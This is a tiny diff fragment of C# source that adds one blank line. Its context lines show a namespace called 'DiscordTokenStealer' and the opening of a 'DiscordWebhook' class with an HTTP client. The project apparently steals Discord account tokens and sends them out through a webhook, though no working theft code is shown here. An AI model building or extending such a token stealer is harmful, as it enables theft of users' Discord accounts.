@@ -2,6 +2,7 @@
 using System.Net.Http.Json;
 
 namespace DiscordTokenStealer.Discord;
+
 public class DiscordWebhook : IDisposable
 {
     private readonly HttpClient _client;
